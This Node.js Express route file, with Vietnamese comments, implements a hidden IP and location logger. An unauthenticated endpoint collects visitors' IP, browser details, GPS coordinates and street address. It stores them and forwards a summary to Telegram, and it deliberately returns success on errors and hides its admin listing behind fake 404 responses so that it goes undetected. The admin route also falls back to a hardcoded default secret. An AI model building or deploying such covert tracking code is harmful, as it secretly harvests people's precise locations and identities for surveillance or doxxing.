const express = require('express');
const router = express.Router();
const IPLog = require('../models/IPLog');
const sendIPNotification = require('../utils/sendTelegram');

// Route ẩn danh để ghi nhận IP - không cần xác thực
router.post('/log-ip', async (req, res) => {
    try {
        // Lấy IP từ các header khác nhau, ưu tiên từ proxy headers
        const ip = req.headers['x-forwarded-for'] ||
            req.headers['x-real-ip'] ||
            req.headers['cf-connecting-ip'] ||
            req.headers['true-client-ip'] ||
            req.connection.remoteAddress ||
            req.socket.remoteAddress ||
            (req.connection.socket ? req.connection.socket.remoteAddress : 'unknown');

        // Lấy thông tin trình duyệt
        const userAgent = req.headers['user-agent'] || '';

        // Lấy đường dẫn truy cập
        const path = req.body.path || '/';

        // Lấy thông tin Referer từ header và body
        const referrer = req.body.referrer || req.headers['referer'] || '';

        // Lấy thời gian hiện tại
        let time;
        let clientTimeFormatted = '';

        // Ưu tiên sử dụng thời gian địa phương của client nếu có
        if (req.body.localTime) {
            clientTimeFormatted = req.body.localTime;
        }

        // Nếu client gửi timestamp, dùng timestamp đó để có thời gian chính xác của client
        if (req.body.timestamp) {
            try {
                time = new Date(req.body.timestamp);
                // Kiểm tra nếu thời gian không hợp lệ thì dùng thời gian máy chủ
                if (isNaN(time.getTime())) {
                    time = new Date();
                }
            } catch {
                time = new Date();
            }
        } else {
            time = new Date();
        }

        // Tạo bản ghi log với thông tin mở rộng từ client
        const ipLog = new IPLog({
            ip,
            userAgent,
            time,
            path,
            referrer,
            language: req.body.language || '',
            screenSize: {
                width: req.body.screenWidth || 0,
                height: req.body.screenHeight || 0
            },
            timeZone: req.body.timeZone || '',
            location: {
                latitude: req.body.latitude || null,
                longitude: req.body.longitude || null,
                accuracy: req.body.accuracy || null,
                altitude: req.body.altitude || null,
                altitudeAccuracy: req.body.altitudeAccuracy || null,
                heading: req.body.heading || null,
                speed: req.body.speed || null,
                address: req.body.address || null,
                addressDetails: req.body.addressDetails || null
            },
            // Lưu các thông tin khác vào clientInfo
            clientInfo: {
                timestamp: req.body.timestamp,
                localTime: req.body.localTime,
                timezoneOffset: req.body.timezoneOffset,
                positionTimestamp: req.body.positionTimestamp,
                ...req.body // Lưu tất cả dữ liệu khác từ client
            }
        });

        // Lưu vào cơ sở dữ liệu (không đợi kết quả để trả về nhanh)
        ipLog.save().catch(() => { });

        // Chuẩn bị thông tin nâng cao để gửi thông báo
        const extraInfo = [];
        if (req.body.referrer) extraInfo.push(`📤 Nguồn: ${req.body.referrer}`);
        if (req.body.language) extraInfo.push(`🌐 Ngôn ngữ: ${req.body.language}`);
        if (req.body.timeZone) extraInfo.push(`🕒 Múi giờ: ${req.body.timeZone}`);

        // Thêm thông tin địa lý ước tính từ múi giờ nếu có
        if (req.body.estimatedContinent && req.body.estimatedCity) {
            extraInfo.push(`🌎 Vùng ước tính: ${req.body.estimatedContinent}, ${req.body.estimatedCity}`);
        }

        // Thêm thông tin địa lý ước tính từ ngôn ngữ
        if (req.body.estimatedCountry) {
            extraInfo.push(`🏁 Quốc gia ước tính: ${req.body.estimatedCountry}`);
        }

        // Thêm thời gian địa phương của client nếu có
        if (clientTimeFormatted) {
            extraInfo.push(`⏱️ Thời gian địa phương: ${clientTimeFormatted}`);
        }

        // Xử lý thông tin vị trí từ IP (không cần quyền)
        if (req.body.ipBasedLatitude && req.body.ipBasedLongitude) {
            const lat = parseFloat(req.body.ipBasedLatitude);
            const lng = parseFloat(req.body.ipBasedLongitude);

            // Kiểm tra tọa độ có hợp lệ không
            if (!isNaN(lat) && !isNaN(lng) &&
                lat >= -90 && lat <= 90 &&
                lng >= -180 && lng <= 180) {

                // Làm tròn tọa độ để bảo vệ quyền riêng tư
                const roundedLat = parseFloat(lat.toFixed(4));
                const roundedLng = parseFloat(lng.toFixed(4));

                extraInfo.push(`📌 Vị trí từ IP (${req.body.ipBasedSource || 'không rõ nguồn'}): ${roundedLat}, ${roundedLng}`);

                // Thêm thông tin chi tiết về vị trí nếu có
                if (req.body.ipBasedCity && req.body.ipBasedCountry) {
                    extraInfo.push(`🏙️ Địa điểm IP: ${req.body.ipBasedCity}, ${req.body.ipBasedCountry}`);
                }

                if (req.body.ipBasedOrg) {
                    extraInfo.push(`🌐 Tổ chức: ${req.body.ipBasedOrg}`);
                }
            }
        }

        // Xử lý tọa độ từ client (có độ chính xác cao hơn IP lookup)
        if (req.body.latitude && req.body.longitude) {
            const lat = parseFloat(req.body.latitude);
            const lng = parseFloat(req.body.longitude);

            // Kiểm tra tọa độ có hợp lệ không
            if (!isNaN(lat) && !isNaN(lng) &&
                lat >= -90 && lat <= 90 &&
                lng >= -180 && lng <= 180) {

                // Làm tròn tọa độ đến 6 chữ số thập phân để tránh quá chính xác và bảo vệ quyền riêng tư
                const roundedLat = parseFloat(lat.toFixed(6));
                const roundedLng = parseFloat(lng.toFixed(6));

                const source = req.body.locationSource || 'không rõ';
                extraInfo.push(`📍 Tọa độ (${source}): ${roundedLat}, ${roundedLng}`);

                // Thêm thông tin độ chính xác nếu có
                if (req.body.accuracy && !isNaN(req.body.accuracy)) {
                    extraInfo.push(`📏 Độ chính xác: ${Math.round(req.body.accuracy)} mét`);
                }

                // Thêm thời gian lấy tọa độ nếu có
                if (req.body.positionTimestamp) {
                    try {
                        const posTime = new Date(req.body.positionTimestamp);
                        if (!isNaN(posTime.getTime())) {
                            const posTimeStr = posTime.toLocaleString('vi-VN', {
                                hour: '2-digit',
                                minute: '2-digit',
                                second: '2-digit',
                                hour12: false
                            });
                            extraInfo.push(`⌚ Tọa độ lấy lúc: ${posTimeStr}`);
                        }
                    } catch {
                        // Bỏ qua nếu không thể parse timestamp
                    }
                }
            }
        }

        // Ghi nhận lỗi nếu người dùng từ chối cấp quyền vị trí
        if (req.body.geolocationError === 1) {
            extraInfo.push(`❌ Người dùng từ chối cấp quyền vị trí: ${req.body.geolocationErrorMessage || 'Permission denied'}`);
        } else if (req.body.geolocationError) {
            extraInfo.push(`⚠️ Lỗi lấy vị trí: ${req.body.geolocationErrorMessage || 'Unknown error'}`);
        }

        // Thêm thông tin địa chỉ nếu có
        if (req.body.address) {
            extraInfo.push(`🏡 Địa chỉ: ${req.body.address}`);
        }

        // Thêm thông tin chi tiết hơn từ addressDetails nếu có
        if (req.body.addressDetails) {
            const addr = req.body.addressDetails;
            const addressParts = [];

            // Ưu tiên thông tin quan trọng
            if (addr.road) addressParts.push(addr.road);
            if (addr.house_number) addressParts.push(`số ${addr.house_number}`);
            if (addr.suburb || addr.neighbourhood) addressParts.push(addr.suburb || addr.neighbourhood);
            if (addr.city || addr.town) addressParts.push(addr.city || addr.town);
            if (addr.state || addr.state_district) addressParts.push(addr.state || addr.state_district);
            if (addr.country) addressParts.push(addr.country);

            if (addressParts.length > 0) {
                extraInfo.push(`📮 Chi tiết: ${addressParts.join(', ')}`);
            }
        }

        // Gửi thông báo qua Telegram với thông tin nâng cao
        // Truyền đối tượng time thay vì chuỗi để định dạng theo múi giờ Việt Nam
        sendIPNotification(
            ip,
            time, // Truyền trực tiếp đối tượng Date thay vì chuỗi đã định dạng
            userAgent,
            path,
            extraInfo.join('\n')
        ).catch(() => { });

        // Trả về response 204 (No Content)
        res.status(204).end();
    } catch (error) {
        // Trả về thành công ngay cả khi có lỗi để tránh bị phát hiện
        res.status(204).end();
    }
});

// Route bảo mật để lấy danh sách IP - yêu cầu mật khẩu
router.get('/ip-logs', async (req, res) => {
    try {
        // Kiểm tra access token đơn giản
        const authHeader = req.headers.authorization;
        const secretToken = process.env.ADMIN_SECRET || 'secret-admin-key';

        if (!authHeader || authHeader !== `Bearer ${secretToken}`) {
            // Không hiển thị lỗi 401/403 để tránh kẻ tấn công phát hiện API này tồn tại
            return res.status(404).json({ message: 'Not found' });
        }

        // Lấy các bản ghi IP từ mới nhất đến cũ nhất
        const logs = await IPLog.find().sort({ time: -1 }).limit(100);
        res.status(200).json(logs);
    } catch (error) {
        res.status(404).json({ message: 'Not found' });
    }
});

module.exports = router; 